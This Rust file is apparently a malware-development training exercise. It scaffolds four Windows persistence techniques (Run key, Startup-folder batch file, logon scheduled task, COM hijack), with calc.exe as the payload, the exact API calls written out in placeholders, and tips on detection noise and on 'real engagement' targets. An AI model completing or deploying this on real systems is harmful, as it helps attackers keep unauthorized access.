use std::ffi::c_void;
use windows::Win32::Foundation::{BOOL, HANDLE};
use windows::Win32::Storage::FileSystem::CopyFileA;
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExA, RegSetValueExA,
    HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_OPTION_NON_VOLATILE, REG_SZ,
};
use windows::Win32::System::Threading::{
    CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
};
use windows::Win32::UI::Shell::SHGetFolderPathA;
use windows::core::PCSTR;

// Payload to install — for testing, we use calc.exe
const PAYLOAD_PATH: &[u8] = b"C:\\Windows\\System32\\calc.exe\0";
// Task and key name used for all persistence entries — change before real use
const ENTRY_NAME: &[u8] = b"MaldevTest\0";

fn main() {
    unsafe {
        method1_run_key();
        method2_startup_folder();
        method3_scheduled_task();
        method4_com_hijack();
    }
    println!("All persistence methods attempted. Verify on reboot/logon.");
}

unsafe fn method1_run_key() {
    // Method 1 — HKCU Run key (noisiest; flagged by almost every AV)
    // Writing to HKCU\Software\Microsoft\Windows\CurrentVersion\Run causes Windows
    // to launch the value's data as a command every time the user logs in.
    //
    // Step 1 — Open/create the Run key.
    // RegCreateKeyExA(
    //     hkey: HKEY,                       // HKEY_CURRENT_USER — no admin needed
    //     lpsubkey: PCSTR,                  // subkey path under HKCU
    //     reserved: u32,                    // must be 0
    //     lpclass: PCSTR,                   // None / null — key class, unused
    //     dwoptions: REG_OPEN_CREATE_OPTIONS, // REG_OPTION_NON_VOLATILE — persists across reboots
    //     samdesired: REG_SAM_FLAGS,        // KEY_SET_VALUE — we only need to write
    //     lpsecurityattributes: Option<...>, // None
    //     phkresult: *mut HKEY,             // out: handle to the opened/created key
    //     lpdwdisposition: Option<*mut REG_CREATE_KEY_DISPOSITION>, // None — don't care
    // ) -> WIN32_ERROR                      // 0 = ERROR_SUCCESS
    let subkey = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
    let mut hkey = HKEY::default();
    let result = todo!(
        "RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, PCSTR::null(), REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, None, &mut hkey, None)"
    );
    // Check result == 0 (ERROR_SUCCESS)

    // Step 2 — Write the payload path as a string value under the run key.
    // RegSetValueExA(
    //     hkey: HKEY,           // handle from RegCreateKeyExA
    //     lpvaluename: PCSTR,   // name of the value — shown in regedit
    //     reserved: u32,        // must be 0
    //     dwtype: REG_VALUE_TYPE, // REG_SZ — null-terminated string
    //     lpdata: *const u8,    // pointer to the string data (the payload path)
    //     cbdata: u32,          // byte count INCLUDING the null terminator
    // ) -> WIN32_ERROR          // 0 = ERROR_SUCCESS
    let _result = todo!(
        "RegSetValueExA(hkey, ENTRY_NAME as PCSTR, 0, REG_SZ, PAYLOAD_PATH.as_ptr(), PAYLOAD_PATH.len() as u32)"
    );

    // Step 3 — Close the key handle.
    todo!("RegCloseKey(hkey)");

    println!("[+] Run key written: HKCU\\...\\Run\\MaldevTest");
}

unsafe fn method2_startup_folder() {
    // Method 2 — Startup folder (noisy; well-known but trivially detectable)
    // Files dropped in the user's Startup folder are executed on every login.
    // We write a tiny .bat file that runs the payload.
    //
    // Step 4 — Get the path to the user's Startup folder.
    // SHGetFolderPathA(
    //     hwnd: HWND,         // None — no owner window
    //     csidl: i32,         // CSIDL_STARTUP (0x0007) — current user's Startup folder
    //     htoken: HANDLE,     // None — current user's token
    //     dwflags: u32,       // 0 — return existing path as-is
    //     pszpath: PSTR,      // out: MAX_PATH buffer that receives the path
    // ) -> HRESULT            // S_OK (0) on success
    let mut startup_path = [0u8; 260]; // MAX_PATH
    let _hr = todo!("SHGetFolderPathA(None, 0x0007, None, 0, PSTR(startup_path.as_mut_ptr()))");

    // Step 5 — Write a .bat file into the Startup folder, then call CopyFileA.
    // Alternatively, create a shortcut (.lnk) to the payload — .bat is simpler for learning.
    // Build the destination path: startup_path + "\\MaldevTest.bat"
    //
    // For the .bat contents, write "start C:\Windows\System32\calc.exe" to a temp file,
    // then CopyFileA(temp_path, dest_path, FALSE).
    //
    // CopyFileA(
    //     lpexistingfilename: PCSTR, // source file path
    //     lpnewfilename: PCSTR,      // destination path in Startup folder
    //     bfailifexists: BOOL,       // FALSE — overwrite if present
    // ) -> BOOL                      // TRUE on success
    todo!("build dest path, write bat contents, CopyFileA to startup folder");

    println!("[+] Startup folder payload written");
}

unsafe fn method3_scheduled_task() {
    // Method 3 — Scheduled task via schtasks.exe (medium noise; leaves event log entries)
    // The proper API path uses the ITaskService COM interface, but schtasks.exe is simpler
    // to show the concept. See README for the COM approach.
    //
    // Step 6 — Spawn schtasks.exe with /create arguments.
    // CreateProcessA(
    //     lpapplicationname: PCSTR,                  // None — use lpcommandline
    //     lpcommandline: PSTR,                       // the full schtasks command (mutable buffer!)
    //     lpprocessattributes: Option<...>,          // None
    //     lpthreadattributes: Option<...>,           // None
    //     binherithandles: BOOL,                     // FALSE
    //     dwcreationflags: PROCESS_CREATION_FLAGS,   // 0 — run normally
    //     lpenvironment: Option<*const c_void>,      // None
    //     lpcurrentdirectory: PCSTR,                 // None
    //     lpstartupinfo: *const STARTUPINFOA,        // &si
    //     lpprocessinformation: *mut PROCESS_INFORMATION, // &mut pi
    // ) -> Result<()>
    //
    // Command: schtasks /create /tn "MaldevTest" /tr "C:\Windows\System32\calc.exe" /sc onlogon /f
    let mut cmd = b"schtasks /create /tn \"MaldevTest\" /tr \"C:\\Windows\\System32\\calc.exe\" /sc onlogon /f\0".to_vec();
    let mut si = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    todo!("CreateProcessA(None, PSTR(cmd.as_mut_ptr()), None, None, FALSE, 0, None, PCSTR::null(), &si, &mut pi)");
    // Wait for schtasks to finish: WaitForSingleObject(pi.hProcess, INFINITE)
    todo!("WaitForSingleObject + close pi.hProcess and pi.hThread");

    println!("[+] Scheduled task created: MaldevTest");
}

unsafe fn method4_com_hijack() {
    // Method 4 — COM object hijacking via HKCU (low noise; no admin required)
    //
    // When an application instantiates a COM object, Windows first checks HKCU\Software\Classes
    // before HKLM\SOFTWARE\Classes. By registering a CLSID under HKCU pointing to our DLL,
    // we redirect COM resolution for that class — no elevation needed.
    //
    // We use CLSID {B54F3741-5B07-11CF-A4B0-00AA004A55E8} (VBScript engine) as an example.
    // In a real engagement you would find a CLSID loaded by a high-value auto-starting process.
    //
    // Step 7 — Create the InprocServer32 subkey under HKCU\Software\Classes\CLSID\{...}
    // Step 8 — Set the (default) value to the path of our payload DLL.
    // Step 9 — Optionally set ThreadingModel = "Both"
    //
    // Note: for this to trigger execution you need a DLL, not an EXE. For testing, point at any
    // existing DLL or write a minimal DLL in a later exercise.
    let clsid_key = b"Software\\Classes\\CLSID\\{B54F3741-5B07-11CF-A4B0-00AA004A55E8}\\InprocServer32\0";
    let payload_dll = b"C:\\Windows\\System32\\calc.exe\0"; // placeholder — use a DLL in practice
    let mut hkey = HKEY::default();

    // Step 7
    let _result = todo!(
        "RegCreateKeyExA(HKEY_CURRENT_USER, clsid_key, 0, PCSTR::null(), REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, None, &mut hkey, None)"
    );

    // Step 8 — Set the default value (empty string name) to the DLL path.
    // An empty PCSTR name sets the key's (Default) value.
    let _result = todo!(
        "RegSetValueExA(hkey, PCSTR::null(), 0, REG_SZ, payload_dll.as_ptr(), payload_dll.len() as u32)"
    );

    // Step 9 — (Optional) Set ThreadingModel to avoid COM activation errors.
    let threading = b"Both\0";
    let threading_name = b"ThreadingModel\0";
    let _result = todo!(
        "RegSetValueExA(hkey, threading_name, 0, REG_SZ, threading.as_ptr(), threading.len() as u32)"
    );

    todo!("RegCloseKey(hkey)");

    println!("[+] COM hijack key written: HKCU\\...\\{{B54F3741...}}\\InprocServer32");
}
